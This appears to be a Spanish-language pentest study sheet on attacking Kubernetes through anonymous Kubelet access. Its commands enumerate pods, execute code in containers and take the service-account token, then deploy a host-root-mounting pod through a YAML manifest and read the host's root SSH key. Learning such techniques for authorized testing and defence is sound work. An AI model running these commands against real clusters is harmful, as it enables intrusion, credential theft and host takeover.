---
tags:
  - linux
  - kubernetes
  - privex
---
## Conceptos Clave (TL;DR)
* Kubernetes es una plataforma de orquestación de contenedores de código abierto que automatiza el despliegue y escalado de aplicaciones.
* La arquitectura se divide en el Control Plane (nodo maestro que administra el clúster) y los Worker Nodes o Minions (donde se ejecutan las aplicaciones dentro de Pods).
* El componente central es el API Server, el cual soporta control declarativo mediante peticiones RESTful para modificar o consultar el estado del sistema.
* El componente Kubelet permite el acceso anónimo por defecto, tratando cualquier petición sin un certificado de cliente válido como no autenticada, lo que puede exponer información o permitir acciones no autorizadas.

## Herramientas Clave
* **curl / jq**: Para interactuar manualmente con las APIs de Kubernetes y procesar respuestas en formato JSON.
* **kubeletctl**: Herramienta específica para extraer información de pods, escanear vulnerabilidades de ejecución remota de comandos (RCE) e interactuar directamente con los contenedores.
* **kubectl**: Cliente de línea de comandos oficial de Kubernetes utilizado para administrar recursos, validar permisos y desplegar configuraciones.

## Metodología Paso a Paso
1. **Reconocimiento Inicial**: Interactuar con el API Server y el Kubelet API para verificar si el entorno permite el acceso anónimo y evaluar las respuestas del servidor.
2. **Enumeración de Pods**: Extraer la lista de pods para identificar espacios de nombres, imágenes de contenedores en uso y configuraciones pasadas que puedan filtrar secretos o contraseñas.
3. **Ejecución de Comandos (RCE)**: Comprobar qué pods son vulnerables a RCE y obtener ejecución interactiva para determinar el nivel de privilegios actuales, como acceso root dentro del contenedor.
4. **Extracción de Credenciales**: Obtener el token de la cuenta de servicio y el certificado desde el sistema de archivos del contenedor comprometido.
5. **Escalada de Privilegios**: Validar los permisos del token en el clúster. Si se permite la creación de pods, desplegar un pod malicioso que monte el directorio raíz del host para acceder al sistema subyacente y comprometer claves SSH.

## Cheat Sheet de Comandos

```bash
# Intenta acceder a la ruta raíz del API Server de forma anónima ignorando la validación del certificado (-k)
curl https://<TARGET_IP>:6443 -k

# Extrae la lista de pods expuestos a través del Kubelet API y formatea el output JSON
curl https://<TARGET_IP>:10250/pods -k | jq .

# Enumera los pods disponibles de forma estructurada utilizando kubeletctl
kubeletctl -i --server <TARGET_IP> pods

# Escanea todos los pods listados para identificar cuáles son vulnerables a RCE
kubeletctl -i --server <TARGET_IP> scan rce

# Ejecuta el comando "id" dentro de un pod y contenedor específico de forma interactiva
kubeletctl -i --server <TARGET_IP> exec "id" -p <POD_NAME> -c <CONTAINER_NAME>

# Extrae el token de la cuenta de servicio de Kubernetes y lo guarda localmente
kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD_NAME> -c <CONTAINER_NAME> | tee -a k8.token

# Extrae el certificado de la autoridad certificadora de Kubernetes y lo guarda localmente
kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD_NAME> -c <CONTAINER_NAME> | tee -a ca.crt

# Configura el token como variable de entorno
export token=`cat k8.token`

# Lista los permisos asociados al token extraído para verificar qué acciones están permitidas en el clúster
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list
```

### Manifiesto YAML para Escalada de Privilegios
Guarda este contenido como `privesc.yaml` para montar el sistema de archivos raíz del host en el contenedor.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
# Despliega el nuevo pod malicioso en el clúster utilizando las credenciales comprometidas
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 apply -f privesc.yaml

# Verifica que el nuevo pod se haya creado y esté en estado "Running"
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 get pods

# Lee la clave privada SSH del usuario root del sistema host a través del volumen montado en el nuevo pod
kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

## "Gotchas" y Troubleshooting
* **Puertos de Interés**: etcd (2379, 2380), API server (6443), Scheduler (10251), Controller Manager (10252), Kubelet API (10250), Read-Only Kubelet API (10255).
* **Usuario Anónimo**: El identificador `system:anonymous` representa un usuario no autenticado en el API Server, y por lo general recibirá un error `403 Forbidden` al intentar acceder a la ruta raíz.
* **Fuga de Información**: El campo `kubectl.kubernetes.io/last-applied-configuration` dentro de las anotaciones de un pod puede exponer contraseñas, secretos o tokens de API utilizados durante la creación del recurso.
* **Vulnerabilidades de Namespace**: La información de los espacios de nombres (namespaces) extraída puede revelar cómo están organizados los recursos, permitiendo enfocar ataques en zonas específicas del clúster con vulnerabilidades conocidas.